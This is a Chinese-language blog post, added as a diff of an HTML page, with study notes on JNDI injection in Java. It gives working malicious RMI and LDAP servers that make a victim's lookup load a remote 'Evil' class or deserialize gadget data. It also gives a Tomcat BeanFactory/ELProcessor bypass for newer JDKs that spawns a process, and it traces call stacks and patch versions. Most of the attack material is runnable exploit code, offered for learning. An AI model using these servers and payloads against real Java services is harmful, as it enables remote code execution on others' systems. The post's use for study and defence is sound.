@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    
+
+    
+<div class="hd posts">
+
+    <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a>
+    <div class="post-title">
+        <p>
+            JNDI注入学习
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        
+        <div id="table-of-content">
+            <ul id="table-of-content-ul">
+
+            </ul>
+        </div>
+
+        <p>参考：<a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/">https://boogipop.com/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/</a></p>
+<h1 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI-RMI"></a>JNDI-RMI</h1><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>测试jdk8u73。</p>
+<p>server</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Server &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line"></span><br><span class="line">            //一定要以斜杠结尾</span><br><span class="line">            String factoryUrl = &quot;http://127.0.0.1:8000/&quot;;</span><br><span class="line"></span><br><span class="line">//            对应http://127.0.0.1:8000/下的Evil.class</span><br><span class="line">            Reference reference = new Reference(&quot;Evil&quot;,&quot;Evil&quot;, factoryUrl);</span><br><span class="line">            ReferenceWrapper wrapper = new ReferenceWrapper(reference);</span><br><span class="line">            registry.bind(&quot;Foo&quot;, wrapper);</span><br><span class="line"></span><br><span class="line">            System.err.println(&quot;Server ready, factoryUrl:&quot; + factoryUrl);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.err.println(&quot;Server exception: &quot; + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>client</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Client &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        InitialContext initialContext=new InitialContext();</span><br><span class="line">        initialContext.lookup(&quot;rmi://localhost:1099/Foo&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>调用栈</p>
+<p>其中调用了<code>RegistryImpl_Stub#lookup</code>，所以可以用之前RMI反序列化分析的攻击手法攻击客户端。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InitialContext#lookup</span><br><span class="line">	GenericURLContext#lookup</span><br><span class="line">		com.sun.jndi.rmi.registry.RegistryContext#lookup</span><br><span class="line">			this#registry.lookup //this.registry是个RegistryImpl_Stub</span><br><span class="line">			this#decodeObject</span><br><span class="line">				ReferenceWrapper_Stub#getReference</span><br><span class="line">					UnicastRef#invoke</span><br><span class="line">				NamingManager#getObjectInstance</span><br><span class="line">					getObjectFactoryFromReference(ref, factory) //ref是Reference对象，factory是Evil</span><br><span class="line">						helper.loadClass(factoryName); //尝试从classpath加载Evil类</span><br><span class="line">						helper.loadClass(factoryName, codebase);//若加载不到，则使用codebase http://127.0.0.1:8000/</span><br><span class="line">							Class.forName(className, true, urlClassLoader);//使用URLClassLoader加载类</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>jdk8u121后修复。</p>
+<p>修复位置</p>
+<p>在<code>RegistryContext#decodeObject</code>中，添加判断trustURLCodebase是否为true，不为true则：<code>The object factory is untrusted. Set the system property &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;.</code>。</p>
+<h1 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI-LDAP"></a>JNDI-LDAP</h1><p>测试版本JDK8u73</p>
+<h2 id="demo-1"><a href="#demo-1" class="headerlink" title="demo"></a>demo</h2><p>java代码实现的 ldap server，参考自：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/13958047.html">https://www.cnblogs.com/nice0e3/p/13958047.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package jndi_ldap;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import javax.net.ServerSocketFactory;</span><br><span class="line">import javax.net.SocketFactory;</span><br><span class="line">import javax.net.ssl.SSLSocketFactory;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line">import com.unboundid.ldap.sdk.Entry;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line">import com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line">public class Server &#123;</span><br><span class="line"></span><br><span class="line">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class="line"></span><br><span class="line">    public static void main ( String[] tmp_args ) &#123;</span><br><span class="line">        String[] args=new String[]&#123;&quot;http://127.0.0.1:8000/#Evil&quot;&#125;;</span><br><span class="line">        int port = 7777;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">                    &quot;listen&quot;, //$NON-NLS-1$</span><br><span class="line">                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));</span><br><span class="line">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;</span><br><span class="line"></span><br><span class="line">        private URL codebase;</span><br><span class="line"></span><br><span class="line">        public OperationInterceptor ( URL cb ) &#123;</span><br><span class="line">            this.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = new Entry(base);</span><br><span class="line">            try &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            catch ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;</span><br><span class="line">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));</span><br><span class="line">            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);</span><br><span class="line">            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);</span><br><span class="line">            String cbstring = this.codebase.toString();</span><br><span class="line">            int refPos = cbstring.indexOf(&#x27;#&#x27;);</span><br><span class="line">            if ( refPos &gt; 0 ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(0, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span><br><span class="line">            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$</span><br><span class="line">            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>client</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Client &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            new InitialContext().lookup(&quot;ldap://127.0.0.1:7777/fooooooooooooo&quot;);//随便填</span><br><span class="line">        &#125; catch (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InitialContext#lookup</span><br><span class="line">	LdapURLContext#lookup</span><br><span class="line">		GenericURLContext#lookup</span><br><span class="line">			PartialCompositeContext#lookup</span><br><span class="line">				ComponentContext#p_lookup	</span><br><span class="line">					LdapCtx#c_lookup</span><br><span class="line">						this.doSearchOnce(var1, &quot;(objectClass=*)&quot;, var22, true) //这一步就往ldap服务器发送请求了</span><br><span class="line">						Obj#decodeObject //返回一个Reference</span><br><span class="line">							Obj#decodeReference</span><br><span class="line">						DirectoryManager#getObjectInstance</span><br><span class="line">							NamingManager#getObjectFactoryFromReference</span><br><span class="line">								VersionHelper#loadClass</span><br></pre></td></tr></table></figure>
+
+<p><code>LdapCtx#doSearchOnce</code>执行结束后，server就已经输出了<code>Send LDAP reference result for asd redirecting to http://127.0.0.1:8000/Evil.class</code>。</p>
+<p><code>Obj#decodeObject</code>执行结束后返回的结果：</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/JNDI/image-20240213112003367.png" alt="image-20240213112003367.png"></p>
+<h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><p>JDK 11.0.1、8u191、7u201、6u211之后修复。</p>
+<p>在<code>VersionHelper#loadClass</code>中，添加了判断<code>com.sun.jndi.ldap.object.trustURLCodebase</code>是否为true</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/JNDI/image-20240213112724372.png" alt="image-20240213112724372.png"></p>
+<h1 id="高版本JDK-JNDI注入"><a href="#高版本JDK-JNDI注入" class="headerlink" title="高版本JDK JNDI注入"></a>高版本JDK JNDI注入</h1><p>以JDK8u191为分界，&lt;8u191用上面的方式，≥8u191用下面的</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8214">https://xz.aliyun.com/t/8214</a></p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>本地测试，JDK17仍然生效。</p>
+<p>server</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Server &#123;</span><br><span class="line"></span><br><span class="line">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class="line"></span><br><span class="line">    public static void main ( String[] tmp_args ) &#123;</span><br><span class="line">        int port = 7777;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">                    &quot;listen&quot;, //$NON-NLS-1$</span><br><span class="line">                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(new OperationInterceptor());</span><br><span class="line">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;</span><br><span class="line"></span><br><span class="line">        public OperationInterceptor () &#123;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = new Entry(base);</span><br><span class="line">            try &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            catch ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception &#123;</span><br><span class="line">            System.out.println(&quot;Sendding unserialized data...&quot;);</span><br><span class="line">            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);</span><br><span class="line">            e.addAttribute(&quot;javaSerializedData&quot;, Util.serialize(new Bean())); // 这里放序列化数据</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>client</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Client &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            new InitialContext().lookup(&quot;ldap://127.0.0.1:7777/fooooooooooooo&quot;);//随便填</span><br><span class="line">        &#125; catch (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InitialContext#lookup</span><br><span class="line">	LdapURLContext#lookup</span><br><span class="line">		GenericURLContext#lookup</span><br><span class="line">			PartialCompositeContext#lookup</span><br><span class="line">				ComponentContext#p_lookup	</span><br><span class="line">					LdapCtx#c_lookup</span><br><span class="line">						this.doSearchOnce(var1, &quot;(objectClass=*)&quot;, var22, true) //这一步就往ldap服务器发送请求了</span><br><span class="line">						Obj#decodeObject</span><br><span class="line">							Obj#deserializeObject</span><br><span class="line">								readObject</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="加载本地类"><a href="#加载本地类" class="headerlink" title="加载本地类"></a>加载本地类</h2><p>JDK8u202可以打通。</p>
+<p>server</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port 1097&quot;);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"></span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;remoteobj&quot;, referenceWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ResourceRef需要tomcat依赖，这里用内置tomcat</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.5.55&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.5.55&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>高版本的tomcat修复了这一利用点，会提示：（我第一次测试使用8.5.81，也有这个提示，换成8.5.55可以。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二月 13, 2024 1:51:21 下午 org.apache.naming.factory.BeanFactory getObjectInstance</span><br><span class="line">警告: The forceString option has been removed as a security hardening measure. Instead, if the setter method doesn&#x27;t use String, a primitive or a primitive wrapper, the factory will look for a method with the same name as the setter that accepts a String and use that if found.</span><br><span class="line">Exception in thread &quot;main&quot; javax.naming.NamingException: No set method found for property [x]</span><br><span class="line">	at org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:206)</span><br><span class="line">	at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:321)</span><br><span class="line">	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)</span><br><span class="line">	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)</span><br><span class="line">	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)</span><br><span class="line">	at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">	at jndi_rmi.bypass.Client.main(Client.java:9)</span><br></pre></td></tr></table></figure>
+
+<p>client</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Client &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        InitialContext initialContext=new InitialContext();</span><br><span class="line">        initialContext.lookup(&quot;rmi://localhost:1097/remoteobj&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InitialContext#lookup</span><br><span class="line">	GenericURLContext#lookup</span><br><span class="line">		com.sun.jndi.rmi.registry.RegistryContext#lookup</span><br><span class="line">			this#registry.lookup //this.registry是个RegistryImpl_Stub</span><br><span class="line">			this#decodeObject</span><br><span class="line">				ReferenceWrapper_Stub#getReference</span><br><span class="line">					UnicastRef#invoke</span><br><span class="line">				NamingManager#getObjectInstance</span><br><span class="line">					getObjectFactoryFromReference(ref, factory) //ref是Reference对象，factory是Evil</span><br><span class="line">						helper.loadClass(factoryName); //加载org.apache.naming.factory.BeanFactory</span><br><span class="line">						BeanFactory.newInstance</span><br><span class="line">					BeanFactory#getObjectInstance</span><br><span class="line">						method.invoke(bean, valueArray);//这3个变量都来自ResourceRef</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('img'); // 选择所有 img 元素
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+
+        var getAllHeader = ()=>{
+            var content = document.getElementsByClassName('post-content')[0].childNodes
+            // var h2 = h1.getElementsByTagName("h2")
+            var result = []
+            var pair
+            for(var node of content){   
+                var tagName = (node.tagName?node.tagName:"").toLowerCase()
+                if(tagName === 'h1'){
+                    if(pair){
+                        result.push(pair)
+                    }
+                    pair = {"h1":node,"h2":[]}
+
+                }else if(tagName === 'h2'){
+                    pair.h2.push(node)
+                }
+
+            }
+            result.push(pair)
+            return result
+        }
+
+        var writeHeader = (headers)=>{
+            var _ul = document.getElementById("table-of-content-ul")
+            for(var p of headers){ 
+                console.log(p)
+
+                var h1_li = document.createElement('li')
+                var h1_a = document.createElement('a')
+                h1_a.innerText = p.h1.innerText
+                h1_a.href = `#${p.h1.id}`
+                h1_li.appendChild(h1_a)
+                var ul = document.createElement('ul')
+                for(var h2 of p.h2){
+                    var h2_li = document.createElement('li')
+                    var h2_a = document.createElement('a')
+                    h2_a.innerText = h2.innerText
+                    h2_a.href = `#${h2.id}`
+                    h2_li.appendChild(h2_a)
+                    ul.appendChild(h2_li)
+                }
+                h1_li.appendChild(ul)
+                _ul.appendChild(h1_li)
+            }
+        }
+        var headers = getAllHeader()
+        writeHeader(headers)
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body>
+
+</html>
